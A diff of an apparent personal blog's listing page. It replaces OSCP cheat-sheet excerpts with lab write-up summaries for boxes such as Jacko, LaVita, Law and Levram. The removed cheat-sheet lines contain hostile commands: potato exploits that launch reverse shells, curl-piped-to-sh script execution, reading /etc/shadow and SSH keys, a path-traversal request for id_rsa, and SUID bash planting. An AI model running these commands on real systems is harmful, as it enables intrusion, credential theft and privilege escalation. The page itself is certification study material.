@@ -150,7 +150,7 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---blackgate---linux/">OSCP - Blackgate - Linux</a>
+          <a href="/posts/oscp---jacko---windows/">OSCP - Jacko - Windows</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -167,21 +167,47 @@
 
         <div class="post-content">
           
-            <h1 id="blackgate">Blackgate</h1>
-<p>This is the first of the &ldquo;Hard&rdquo; machines I&rsquo;ve tackled, so I&rsquo;d been worried it may have been a major step up from what I&rsquo;d been doing previously. Surprisingly though, this was very much a case of googling and learning about a service I&rsquo;d never heard of (Redis), connecting to it to test a few commands, and then finding the version I was connected to had a well known RCE exploit and using it to achieve initial access!</p>
+            <h1 id="box">Box</h1>
+<p>What the actual fuck&hellip; I&rsquo;ll write this up tomorrow, but this was a combination of &ldquo;Why the fuck isn&rsquo;t this working&rdquo; with &ldquo;that is so fucking dumb&rdquo; when it did finally work</p>
+<h1 id="resolution-summary">Resolution summary</h1>
+<ul>
+<li>Ran Nmap to identify ports <code>80</code>, <code>135/445</code>, <code>445</code>, <code>5040</code>, <code>8082</code> &amp; <code>9092</code></li>
+<li>Navigated to port <code>8082</code> with browser and logged in with default credentials</li>
+<li>Found exploit for <code>H2 Database</code> and achieved code execution via SQL</li>
+<li>Uploaded &amp; executed reverse shell via SQL statements for initial access</li>
+<li>Identified <code>Paperstream</code> software and found exploit <code>49382.py</code></li>
+<li>Used <code>msfvenom</code> to create reverse shell <code>dll</code> with <code>x86</code> architecture &amp; <code>xor_dynamic</code></li>
+<li>Uploaded <code>dll</code> and <code>49382.ps1</code> to target via <code>iwr</code></li>
+<li>Ran <code>49382.ps1</code> on target and recieved reverse shell as <code>NT-system</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills</h2>
+<ul>
+<li>Generating msfvenom payloads</li>
+<li>Working with Windows kernel exploits (specifically potatos)</li>
+</ul>
+<h2 id="used-tools">Used tools</h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+<li>msfvenom</li>
+<li>powershell</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering</h1>
+<p>Scanned all TCP ports:</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---blackgate---linux/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---jacko---windows/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---boolean---linux/">OSCP - Boolean - Linux</a>
+          <a href="/posts/oscp---kevin---windows-dnf/">OSCP - Kevin - Windows (DNF)</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -198,21 +224,22 @@
 
         <div class="post-content">
           
-            <h1 id="boolean">Boolean</h1>
-<p>This was an absolute slog, and even the walkthroughs didn&rsquo;t help at the end. It was good to identify that BurpSuite would be used early on, but picking up and changing the &ldquo;confirmed&rdquo; element was tricky. Having the PHP reverse shell not work was incredibly frustrating too, but it was obvious something else would be needed when GoBuster wasn&rsquo;t showing where the uploaded files were being stored (obviously download only and not directly web accessible).</p>
+            <h1 id="kevin">Kevin</h1>
+<p>I&rsquo;ve checked all the walkthroughs, tried countless variations of the easily available exploits, even reimaged my entire Kali VM trying to make this script work&hellip; and nothing I&rsquo;ve done has caught a reverse shell.</p>
+<p>Honestly not sure what else to do, other than to write this off as a learning experience (?) and move on. If I get a buffer overflow exploit in the exam (which I think they&rsquo;ve stopped now anyway) I&rsquo;ll just move the fuck on because nothing I&rsquo;ve done on this box or the last one has really made any sense.</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---boolean---linux/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---kevin---windows-dnf/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---active-directory/">OSCP - Cheat Sheet - Active Directory</a>
+          <a href="/posts/oscp---lavita---linux/">OSCP - LaVita - Linux</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -220,8 +247,6 @@
           <span class="post-tags">
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -231,73 +256,22 @@
 
         <div class="post-content">
           
-            <p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">HackTricks - AD Methodology</a></p>
-<h1 id="initial-access">Initial Access</h1>
-<ul>
-<li><code>whoami</code>, <code>whoami /all</code></li>
-<li><code>whoami /priv</code>
-<ul>
-<li>SeImpersonatePrivilege
-<ul>
-<li>Run <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>
-<ul>
-<li><code>./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot;</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/itm4n/FullPowers">FullPowers tool</a></li>
-<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">How to use potatoes</a> &amp; - <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes" title="Pre-compiled">Pre-compiled Potatoes</a></li>
-<li><a href="https://juggernaut-sec.com/seimpersonateprivilege/">How to use Juicy/Rogue Potato &amp; Printspoofer</a></li>
-<li><a href="https://github.com/itm4n/PrintSpoofer">Printspoofer - GitHub</a> <code>.\PrintSpoofer64.exe -i -c powershell.exe</code> <code>whoami</code></li>
-<li><a href="https://github.com/k4sth4/Juicy-Potato/tree/main">Juicy Potato - Github</a> <code>.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot;</code></li>
-</ul>
-</li>
-<li>SEbackupPriv
-<ul>
-<li><a href="https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</a></li>
-<li><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md">https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md</a></li>
-</ul>
-</li>
-<li>SeShutdownPrivilege
-<ul>
-<li>Can a startup process be modified? Then modify &amp; reboot</li>
-<li>Check service has <code>Auto</code>: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
-<li>Reboot: <code>shutdown /r /t 0</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumePrivilege</a>
-<ul>
-<li><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code></li>
-<li></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>whoami /groups</code>,
-<ul>
-<li><code>net localgroup</code> or <code>Get-LocalGroup</code> (Existing groups)</li>
-<li><code>Get-LocalGroupMember groupname</code> (Inspect)</li>
-</ul>
-</li>
-<li><code>systeminfo</code> (wiki build number)
-<ul>
-<li>Windows kernel exploits</li>
-</ul>
-</li>
-</ul>
-<p>More Initial Access</p>
+            <h1 id="lavita">LaVita</h1>
+<p>This box started out really well with plenty of through enumeration to identify the vulnerability, but I fell down trying to gain initial access with the exploits. I tried several, and persisted with the most well developed exploit thinking it would be the way forward.</p>
+<p>The issue was not realising the exploit would stop working after the first success, so after testing it with the <code>uname -a</code> or <code>id</code> commands, it would then not work when I tried to repeat with a reverse shell command. it took awhile to realise that there were 21 chains available, and so there was no need to keep using the &ldquo;last working&rdquo; chain, because it was only working once anyway. I also stopped trying to test with <code>id</code> and just threw the reverse shell command in straight away - I already knew the exploit worked <em>sometimes</em> so may as well try to establish a shell each time I tried.</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---active-directory/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---lavita---linux/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---core/">OSCP - Cheat Sheet - Core</a>
+          <a href="/posts/oscp---law---linux/">OSCP - Law - Linux</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -305,8 +279,6 @@
           <span class="post-tags">
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -316,66 +288,22 @@
 
         <div class="post-content">
           
-            <h1 id="pre-exam">Pre-Exam</h1>
-<ul>
-<li>Download the resources from the dedicated lab clients;</li>
-<li>Document your report as you go during the exam</li>
-<li>Do a practice exam!</li>
-</ul>
-<h1 id="setup">Setup</h1>
-<p>Create directories: <code>mkdir dc host1 host2</code></p>
-<ul>
-<li>Create sub directories: <code>mkdir enu loot files exploits</code>
-Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
-</ul>
-<h1 id="quick-reference">Quick Reference</h1>
-<ul>
-<li><code>sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap</code></li>
-<li><code>sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap</code></li>
-<li><code>gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code></li>
-<li><code>usr/share/wordlists/rockyou.txt</code></li>
-<li><code>usr/share/wordlists/SecLists</code></li>
-<li><code>nc -nvlp 4444</code> <a href="https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1">NetCat Cheat Sheet</a></li>
-<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
-</ul>
-<h1 id="easy-wins">Easy wins</h1>
-<ul>
-<li>Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.</li>
-<li>Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom</li>
-<li>Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea.
-<ul>
-<li>Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest</li>
-</ul>
-</li>
-<li>Regularly review the information you have for a machine - key services, known version numbers, and any known credentials.</li>
-<li>Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file.</li>
-<li>Metasploit - pick the machine that you think you have the least chance of exploiting manually</li>
-</ul>
-<h1 id="general-tips">General Tips</h1>
-<ul>
-<li>xfreerdp can pass the hash to login</li>
-<li><code>runas /user:domain\username cmd.exe</code> (or rdp and open CMD as admin)</li>
-<li>Use the Kali directory: <strong>/usr/share/webshells</strong> for all your payloads.</li>
-<li>MSFVenom Shell code for Buffer Overflow <a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
-<li>If it&rsquo;s running SSH, find/replace the id_rsa</li>
-<li><code>!/bin/bash</code></li>
-<li>SMB - <code>crackmapexec</code> show available shares: <code>crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares</code></li>
-<li>Scanning UDP Ports for SNMP - <a href="https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727">https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727</a></li>
-</ul>
-<p><img src="https://johnjhacking.com/uploads/autonmap.png" alt=""></p>
+            <h1 id="law">Law</h1>
+<p>This one was another absolute slog. Identifying exploits for htmLawed v1.2.5 was very straightforward, and I got a little excited when I saw an RCE exploit had been found this year (2024).</p>
+<p>Running the exploit didn&rsquo;t work though, so I started researching the vulnerability further while trying to avoid the walkthroughs. I found the <a href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/">Mayfly article on the CVE</a> which added a lot of extra context, and checking the walkthrough helped me realise why the Burpsuite request wasn&rsquo;t working properly (the request was to a non-existent page, and needed to be changed to <code>/</code>).</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---core/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---law---linux/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---linux/">OSCP - Cheat Sheet - Linux</a>
+          <a href="/posts/oscp---levram---linux/">OSCP - Levram - Linux</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -383,8 +311,6 @@ Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
           <span class="post-tags">
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -394,95 +320,38 @@ Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
 
         <div class="post-content">
           
-            <h1 id="initial-access">Initial Access</h1>
-<p>Launch Netcat Listener: <code>nc -nvlp 1234</code>
-Launch HTML server: `python3 -m http.server 80
-Launch Python Virtual Environment:</p>
+            <h1 id="levram">Levram</h1>
+<h1 id="resolution-summary">Resolution summary</h1>
 <ul>
-<li><code>cd ~/py</code></li>
-<li>`python3 -m venv venv</li>
-<li><code>source bin/activate Run enum4linux-ng: </code>enum4linux-ng -A 192.168.x.x<code>Run enum4linux:</code>enum4linux 192.168.x.x` (Run both tools)</li>
+<li>Nmap to identify services on port 22 and 8000</li>
+<li>Password guessed admin credentials to Gerapy platform</li>
+<li>Used exploit for CVE-2021-243857 to achieve shell</li>
+<li>Upgraded shell by running bash script on target</li>
+<li>Identified vulnerable python setuid configuration</li>
+<li>Used GTFObins to find python command providing privilege escalation to root</li>
 </ul>
-<h1 id="privesc">PrivEsc</h1>
-<h2 id="upgrade-shell">Upgrade Shell</h2>
+<h2 id="improved-skills">Improved skills</h2>
 <ul>
-<li>`/usr/bin/script -qc /bin/bash /dev/null</li>
-<li>`python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</li>
-<li>`python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo;</li>
-<li><code>/bin/sh -i</code> | <code>/bin/bash -i</code> | <code>echo 'os.system('/bin/bash')'</code></li>
-<li><code>perl -e 'exec &quot;/bin/sh&quot;;'</code></li>
-<li>To escape rbash
-<ul>
-<li><code>ssh user@ip -t &quot;bash --noprofile&quot;</code></li>
-<li><code>export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin</code></li>
+<li>Linux Privilege Escalation</li>
+<li>Establishing Full TTYs</li>
 </ul>
-</li>
-</ul>
-<h2 id="enumerate">Enumerate</h2>
+<h2 id="used-tools">Used tools</h2>
 <ul>
-<li><code>find / -name local.txt -type f 2&gt;/dev/null</code></li>
-<li><code>id</code></li>
-<li><code>cat /etc/passwd</code> | <code>cat /etc/shadow</code> | <code>cat /root/.ssh</code></li>
-<li><code>hostname</code>, <code>cat /etc/issue</code>,<code>cat /etc/os-release</code>, <code>uname -a</code></li>
-<li><code>/home/andrew/.bash_history</code></li>
-<li><code>sudo -l</code> &ndash;&gt; check <a href="https://gtfobins.github.io/">GTFOBins</a></li>
-<li><code>crontab -l</code></li>
-<li><code>su root:root</code>, <code>su andrew:andrew</code>, <code>su andrew:(NOPASS)</code>, <code>sudo -i</code> (reqs root password)</li>
-<li><code>ls /var/mail</code> | <code>ls /var/spool/mail</code></li>
-<li><code>/usr/sbin/getcap -r / 2&gt;/dev/null</code></li>
-<li><a href="https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------">If member of Disk Group</a>
-<ul>
-<li><code>df -h</code> (find OS) | <code>debugfs /dva/OS</code> | <code>/etc/shadow</code> <code>/root/.ssh</code></li>
+<li>nmap</li>
+<li>python</li>
+<li>linpeas.sh</li>
+<li>gerapy</li>
+<li>GTFObins</li>
 </ul>
-</li>
-<li>Binaries
-<ul>
-<li><code>find / -perm -4000 2&gt;/dev/null</code></li>
-<li><code>find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot;</code>
-<ul>
-<li><code>ls -lah</code> &amp; check <a href="https://gtfobins.github.io/">GTFObins</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Processes:
-<ul>
-<li><code>ps -eaf</code></li>
-<li>Watch processes:<code>watch -n 1 &quot;ps -aux | grep pass&quot;</code></li>
-<li>Pspy: <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32">https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32</a>
-<ul>
-<li><code>wget $kaliIP/pspy32</code></li>
-<li><code>chmod +x pspy32</code> &amp; <code>timeout 2m ./pspy32</code></li>
-</ul>
-</li>
-<li>If root is regularly running a writable script: <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; script.sh</code> then <code>/bin/bash -p</code></li>
-</ul>
-</li>
-<li>Enumeration Scripts:
-<ul>
-<li><a href="https://github.com/etc5had0w/suider/blob/main/suider.sh">SUIDer</a>: <code>wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh</code></li>
-<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPeas</a>: <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></li>
-<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
-<li>Kali Pre-installed <code>unix-privesc-check</code></li>
-<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a> <code>https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</code></li>
-<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a> <code>wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="exploit">Exploit</h2>
-<ul>
-<li>RSA key on Linux server: <code>curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa</code></li>
-</ul>
-<h1 id="random---to-sort">Random - To Sort</h1>
-<ul>
-<li>
-<p><code>exiftool -a -u file.pdf</code> (metadata inspector)</p>
+<hr>
+<h1 id="information-gathering">Information Gathering</h1>
+<p>Scanned all TCP ports:</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---linux/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---levram---linux/">[Read more]</a>
           </div>
         
       </article>
